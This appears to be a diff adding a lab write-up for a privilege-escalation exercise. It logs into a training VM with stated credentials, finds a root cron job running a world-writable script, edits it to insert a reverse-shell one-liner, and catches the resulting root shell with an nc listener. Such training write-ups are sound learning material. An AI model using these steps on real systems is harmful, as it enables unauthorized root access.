@@ -1,4 +1,38 @@
 Questions 1
 Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which log file holds information about cron job activities? Include the full path in the answer.
 
+ssh joe@192.168.214.214 
+password: offsec
+
+# Check the filesystem for installed cron jobs on the target system
+# we can also inspect the cron log file (/var/log/cron.log) for running cron jobs
+grep "CRON" /var/log/syslog
+...
+May  1 01:21:01 debian-privesc CRON[1387]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+...
+
+# It appears that a script called user_backups.sh under /home/joe
+#!/bin/bash
+cp -rf /home/joe/ /var/backups/joe/
+
+# The script is pretty straight-forward and it just simply copies the user's home directory to the backup subdirectory.
+# We can see the script is writeable by ls -l
+-rwxrwxrw- 1 root root 50 Aug 25  2022 user_backups.sh
+
+# since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse-shell one liner
+nano .scripts/user_backups.sh
+# Paste the code from bash-revsh.sh Options 4
+
+# On kali machine
+nc -lvnp 6666
+# Then wait for cronjob run
+/bin/sh: 0: can't access tty; job control turned off
+# ls
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# As for the question Which log file holds information about cron job activities? Include the full path in the answer.
+it is /var/log/syslog
 
